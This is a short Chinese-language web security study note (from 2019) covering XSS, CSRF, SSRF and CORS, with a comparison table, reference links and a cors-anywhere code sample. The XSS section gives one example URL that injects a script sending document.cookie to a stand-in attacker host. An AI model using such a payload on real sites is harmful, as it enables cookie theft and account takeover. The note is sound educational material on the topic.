{"title":"網頁安全筆記","slug":"web-security-note","html":"<h2 id=\"xss\">XSS</h2>\n<ul>\n<li>Cross-site scripting</li>\n<li>利用動態產生內容（ex. 輸入欄位）的網頁漏洞，注入惡意腳本的攻擊手法</li>\n<li>例如使用短網址包覆帶有惡意腳本的網址：\n<code>http://app.com/?name=?&lt;script&gt;...attack.com/bad.php?data=document.cookie;&lt;/script&gt;</code></li>\n<li>攻擊者便可取得使用者的 Cookie，並藉此盜用相關資料</li>\n<li>可以針對特殊文字進行處理 (例如 <code>&lt;</code>、<code>&amp;</code>) 防止攻擊。</li>\n</ul>\n<h2 id=\"csrf\">CSRF</h2>\n<ul>\n<li>Cross-site request forgery（跨站請求偽造）</li>\n<li>利用網頁應用本身的漏洞，進行原定以外處理的攻擊手法</li>\n<li>例如使用短網指包覆指定行為的網址：<code>http://app.com/post/</code></li>\n<li>導致使用者身份被盜用，從而進行非原定的行為，例如留下犯罪宣言的訊息</li>\n<li>可以在 request 裡加入 token 驗證這個行為是否真的來自該使用者</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mpyw/items/0595f07736cfa5b1f50c\">これで完璧！今さら振り返る CSRF 対策と同一オリジンポリシーの基礎</a></li>\n</ul>\n<h2 id=\"xss-和-csrf-的差異\">XSS 和 CSRF 的差異</h2>\n<table>\n<thead>\n<tr>\n<th>觀點</th>\n<th>XSS</th>\n<th>CSRF</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>漏洞</td>\n<td>網頁應用程式</td>\n<td>網頁應用程式</td>\n</tr>\n<tr>\n<td>執行機制</td>\n<td>造訪有問題的網址</td>\n<td>造訪有問題的網址</td>\n</tr>\n<tr>\n<td>執行源頭</td>\n<td>網頁瀏覽器 (Client)</td>\n<td>網頁伺服器 (Server)</td>\n</tr>\n<tr>\n<td>執行內容</td>\n<td>JavaScript 所能執行的任意內容</td>\n<td>網頁應用程式內所定義的處理</td>\n</tr>\n<tr>\n<td>執行前提</td>\n<td>無</td>\n<td>受害者需先登入網頁應用程式</td>\n</tr>\n</tbody></table>\n<h2 id=\"sql-injection\">SQL Injection</h2>\n<h2 id=\"clickjacking\">ClickJacking</h2>\n<h2 id=\"open-redirect\">Open Redirect</h2>\n<h2 id=\"dos\">DOS</h2>\n<h2 id=\"insecure-direct-object-reference-vulnerability\">Insecure Direct Object Reference Vulnerability</h2>\n<h2 id=\"json-hijacking\">JSON Hijacking</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://adon988.logdown.com/posts/7820118-introduction-to-json-hijacking\">Json Hijacking 簡介 « 關於網路那些事...</a></li>\n</ul>\n<h2 id=\"ssrf\">SSRF</h2>\n<ul>\n<li>Server-side request forgery</li>\n<li>利用公開網路與內部網路溝通的漏洞，進行繞過權限認證的攻擊方式</li>\n</ul>\n<h2 id=\"同源政策（same-origin-policy）\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy\">同源政策（Same-Origin Policy）</a></h2>\n<h3 id=\"什麼是-cors（cross-origin-resource-sharing，跨來源資源共用）？\">什麼是 CORS（Cross-Origin Resource Sharing，跨來源資源共用）？</h3>\n<h3 id=\"解決方案\">解決方案</h3>\n<h4 id=\"從-api-後端開放權限\">從 API 後端開放權限</h4>\n<h4 id=\"cors-anywhere\">CORS-anywhere</h4>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// use cors-anywhere to fetch api data</span>\n<span class=\"token keyword\">const</span> cors <span class=\"token operator\">=</span> <span class=\"token string\">\"https://cors-anywhere.herokuapp.com/\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// origin api url</span>\n<span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token string\">\"https://tw.rter.info/capi.php?=1568944322585\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// fetch api url by cors-anywhere</span>\naxios<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>cors<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>url<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span>\n  <span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> msg <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span>\n    document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"參考文章\">參考文章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://shubo.io/what-is-cors/\">[教學] CORS 是什麼? 如何設定 CORS? | Shubo’s Notes</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2017/05/20/api-ajax-cors-and-jsonp/\">輕鬆理解 Ajax 與跨來源請求</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2018/08/18/cors-issue/\">原來 CORS 沒有我想像中的簡單</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/d-d-mag/%E5%92%8C-cors-%E8%B7%9F-cookie-%E6%89%93%E4%BA%A4%E9%81%93-dd420ccc7399\">和 CORS 跟 cookie 打交道</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.kalan.dev/abort-controller/\">新的取消請求方式 - AbortController | 半熟前端</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/xixigiggling/my-ice-cream/issues/9\">这波跨域不亏 · Issue #9 · xixigiggling/my-ice-cream</a></li>\n</ul>\n<h2 id=\"相關文章\">相關文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/E-46/items/93199f38bdacd6b6076a\">安全な Web サイトのつくりかた　ざっくりまとめ part1</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/E-46/items/aa43b6a01de8ab205591\">安全な Web サイトのつくりかた　ざっくりまとめ part2</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/uichi/items/c34536b66101e9440cf2\">個人開発でも最低限やっておくべきインフラレベルでのセキュリティ対策</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Tsutou/items/cea87dbab0f3d0080422\">Web セキュリティ覚書 : &quot;HTTPS&quot; 編 [ 初学者向け ]</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Tsutou/items/4fd498f8ab2638bd5650\">Web セキュリティ覚書 : &quot;攻撃&quot; 編 [ 初学者向け ]</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@jaydenlin/same-origin-policy-%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96-%E4%B8%80%E5%88%87%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A4%8E-36432565a226\">Same Origin Policy 同源政策 ! 一切安全的基礎</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/wanko5296/items/142b5b82485b0196a2da\">3 分でわかる XSS と CSRF の違い</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://speakerdeck.com/hasegawayosuke/ssrfji-chu\">SSRF 基礎 - Speaker Deck</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://yamory.io/blog/about-ssrf/\">URL の取り扱いには要注意！ SSRF の攻撃と対策 | yamory Blog</a></li>\n</ul>\n","date":"2019-09-02T05:44:11.000Z","excerpt":null,"printDate":"September 2, 2019","printReadingTime":"2 min read","tags":[],"image":"https://f6bfb5.github.io/preview/web-security-note.png"}